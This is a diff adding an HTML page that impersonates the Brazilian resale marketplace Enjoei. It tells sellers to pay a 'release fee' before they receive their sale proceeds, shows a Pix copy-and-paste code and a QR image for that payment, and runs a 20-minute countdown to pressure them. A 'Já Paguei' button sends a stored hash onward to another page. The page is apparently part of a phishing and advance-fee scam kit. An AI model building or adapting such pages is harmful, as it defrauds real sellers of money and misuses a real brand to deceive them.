@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="O site mais simpático para comprar e vender online roupas, sapatos e bolsas! Marcas Zara, Farm, Nike. Baixe o app e vem conferir!">
+    <title>Informações de Recebimentos - Enjoei</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap">
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f4f7fc;
+            color: #333;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Container principal */
+        .o-container {
+            max-width: 100%;
+            padding: 0 20px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .c-clean-header {
+            background: linear-gradient(135deg, #61005D, #8e2a7f);
+            color: #fff;
+            padding: 15px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .c-clean-header__wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .o-logo.-enjoei {
+            width: 120px;
+            height: 30px;
+            transition: transform 0.3s ease;
+        }
+
+        .o-logo.-enjoei:hover {
+            transform: scale(1.05);
+        }
+
+        /* Seção de pagamento */
+        .session-wrapper {
+            max-width: 600px;
+            margin: 50px auto;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            padding: 32px;
+            transition: transform 0.3s ease;
+        }
+
+        .session-wrapper:hover {
+            transform: translateY(-5px);
+        }
+
+        .session-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .session-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #61005D;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .session-text {
+            font-size: 16px;
+            color: #666;
+            margin: 0;
+        }
+
+        /* Formulário */
+        .l-form {
+            margin-top: 32px;
+        }
+
+        .o-form__field {
+            margin-bottom: 24px;
+        }
+
+        .l-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+            text-transform: uppercase;
+        }
+
+        .o-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            background: #fafafa;
+        }
+
+        .o-input:focus {
+            border-color: #61005D;
+            box-shadow: 0 0 8px rgba(97, 0, 93, 0.2);
+            outline: none;
+        }
+
+        /* Botões */
+        .o-button {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+        }
+
+        .o-button.-xs-primary {
+            background: linear-gradient(135deg, #61005D, #8e2a7f);
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(97, 0, 93, 0.3);
+        }
+
+        .o-button.-xs-primary:hover {
+            background: linear-gradient(135deg, #4a0047, #6b205f);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(97, 0, 93, 0.4);
+        }
+
+        .o-button.-xs-link {
+            background: none;
+            color: #61005D;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+
+        .o-button.-xs-link:hover {
+            color: #8e2a7f;
+        }
+
+        /* QR Code */
+        .separator {
+            display: block;
+            text-align: center;
+            margin: 30px 0;
+            color: #999;
+            font-size: 14px;
+            position: relative;
+            font-weight: 600;
+        }
+
+        .separator:before,
+        .separator:after {
+            content: "";
+            display: inline-block;
+            width: 40%;
+            height: 1px;
+            background: linear-gradient(to right, transparent, #e0e0e0, transparent);
+            position: absolute;
+            top: 50%;
+        }
+
+        .separator:before {
+            left: 0;
+        }
+
+        .separator:after {
+            right: 0;
+        }
+
+        /* Contador */
+        .contador {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            text-align: center;
+            margin: 24px 0;
+            padding: 16px;
+            background: linear-gradient(135deg, #61005D, #8e2a7f);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .contador .fa-clock {
+            font-size: 20px;
+            color: #fff;
+        }
+
+        /* Alertas */
+        .alert-bubble {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #ff6f91, #ff8fa3);
+            color: #fff;
+            padding: 16px 32px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: none;
+            animation: fadeIn 0.5s ease, fadeOut 0.5s ease 2.5s;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -60%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; transform: translate(-50%, -50%); }
+            to { opacity: 0; transform: translate(-50%, -60%); }
+        }
+
+        /* Rodapé */
+        .o-text.-xs-minion {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 32px;
+        }
+
+        .o-text.-xs-minion a {
+            color: #61005D;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .o-text.-xs-minion a:hover {
+            color: #8e2a7f;
+        }
+
+        /* Estilo para erros */
+        .erro {
+            border-color: #ff4d4d !important;
+            box-shadow: 0 0 8px rgba(255, 77, 77, 0.2);
+        }
+
+        .mensagem-erro {
+            color: #ff4d4d;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* Well */
+        .o-well {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .o-well:hover {
+            background: #f0f0f0;
+        }
+
+        /* QR Code */
+        .qr-code-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .qr-code-container img {
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .qr-code-container img:hover {
+            transform: scale(1.05);
+        }
+
+        /* Responsividade */
+        @media (max-width: 600px) {
+            .session-wrapper {
+                margin: 20px;
+                padding: 24px;
+            }
+
+            .session-title {
+                font-size: 24px;
+            }
+
+            .session-text {
+                font-size: 14px;
+            }
+
+            .o-button {
+                padding: 14px;
+            }
+
+            .contador {
+                font-size: 20px;
+                padding: 12px;
+            }
+        }
+
+        /* Logo banner */
+        .logo-banner {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: fadeOutBanner 1.5s ease forwards;
+        }
+
+        .logo-banner svg {
+            width: 50px;
+            height: 50px;
+            animation: bounce 1s ease infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes fadeOutBanner {
+            0% { opacity: 1; }
+            100% { opacity: 0; display: none; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo Banner -->
+    <div class="logo-banner">
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none">
+            <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path>
+        </svg>
+    </div>
+
+    <!-- Header -->
+    <header class="c-clean-header">
+        <div class="c-clean-header__wrapper">
+        </div>
+    </header>
+
+    <!-- Seção de Pagamento -->
+    <section data-vue="sessions-new-page">
+        <div class="o-container -with-gutter l-container">
+            <div class="session-wrapper">
+                <header class="session-header">
+                    <h1 class="session-title">Realize o Pagamento</h1>
+                    <p class="session-text">Pague a taxa de liberação e receba o valor da sua venda!</p>
+                </header>
+                <div class="l-wrapper">
+                    <input type="hidden" name="utf8" value="✓">
+                    <input type="hidden" name="authenticity_token" value="iKVQdiyYPEusrrS/sBDMD+YlR+u8eBMXDPzVQHyoUhb+5hUY5bLsahiCEgCuCOz2daHp4GvMJuU7bOEwxhx1uw==">
+                    <input type="hidden" name="user_tracking_uuid" value="aba1a12a-006e-4862-91fb-af630091c401-1720133651762">
+
+                    <!-- Contador -->
+                    <div id="contador" class="contador">
+                        <i class="fa fa-clock"></i> 19:57
+                    </div>
+
+                    <!-- QR Code -->
+                    <div class="qr-code-container">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=000éria de transferência" alt="QR Code">
+                    </div>
+
+                    <!-- Separador -->
+                    <span class="separator">QR</span>
+
+                    <!-- Campo Copia e Cola -->
+                    <div class="o-form__field l-field">
+                        <label for="valorParaCopiar" class="l-label">Copia e Cola</label>
+                        <input id="valorParaCopiar" data-validate="true" type="text" value="00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/5438b624-716b-4075-9860-4387f74c24ea5204000053039865802BR5925PAGFACIL_MEIOS_DE_PAGAMEN6005SINOP62070503***63047DC1" class="o-input -fill -xs-medium -md-large" readonly>
+                    </div>
+
+                    <!-- Mensagem de Erro -->
+                    <div id="mensagem-erro" class="mensagem-erro"></div>
+
+                    <!-- Botão Copiar -->
+                    <div class="o-well">
+                        <button data-test="button-login-entrar" class="o-button -xs-flat -xs-large -xs-fill -xs-primary" onclick="copiarValor()">Copiar</button>
+                    </div>
+
+                    <!-- Alerta de Cópia -->
+                    <div id="alertaCopiado" class="alert-bubble">
+                        Pix copiado! Faça o pagamento.
+                    </div>
+
+                    <!-- Separador -->
+                    <span class="separator">ou</span>
+
+                    <!-- Botão Já Paguei -->
+                    <div class="o-well">
+                        <button data-test="button-login-entrar" class="o-button -xs-flat -xs-large -xs-fill -xs-primary" onclick="pay()">Já Paguei</button>
+                    </div>
+
+                    <!-- Rodapé -->
+                    <p class="o-text -xs-minion -xs-regular -xs-center">
+                        Protegido por reCAPTCHA - <a href="#" target="_blank">Privacidade</a> - <a href="#" target="_blank">Condições</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Scripts -->
+    <script src="https://kit.fontawesome.com/your-fontawesome-kit.js" crossorigin="anonymous"></script>
+    <script>
+        function pay() {
+            const hash = localStorage.getItem('hash');
+            window.location.href = `../authpay/?ssid=${hash}`;
+        }
+
+        function copiarValor() {
+            const input = document.getElementById('valorParaCopiar');
+            input.select();
+            document.execCommand('copy');
+            const alerta = document.getElementById('alertaCopiado');
+            alerta.style.display = 'block';
+            setTimeout(() => {
+                alerta.style.display = 'none';
+            }, 3000);
+        }
+
+        function iniciarContador() {
+            let tempoRestante = 1200;
+            const intervalo = setInterval(() => {
+                const minutos = Math.floor(tempoRestante / 60);
+                const segundos = tempoRestante % 60;
+                const segundosFormatados = segundos < 10 ? `0${segundos}` : segundos;
+                document.getElementById('contador').innerHTML = `<i class="fa fa-clock"></i> ${minutos}:${segundosFormatados}`;
+                tempoRestante--;
+                if (tempoRestante < 0) {
+                    clearInterval(intervalo);
+                    document.getElementById('contador').textContent = 'Tempo esgotado!';
+                }
+            }, 1000);
+        }
+
+        window.onload = function() {
+            iniciarContador();
+            setTimeout(() => {
+                document.querySelector('.logo-banner').style.display = 'none';
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
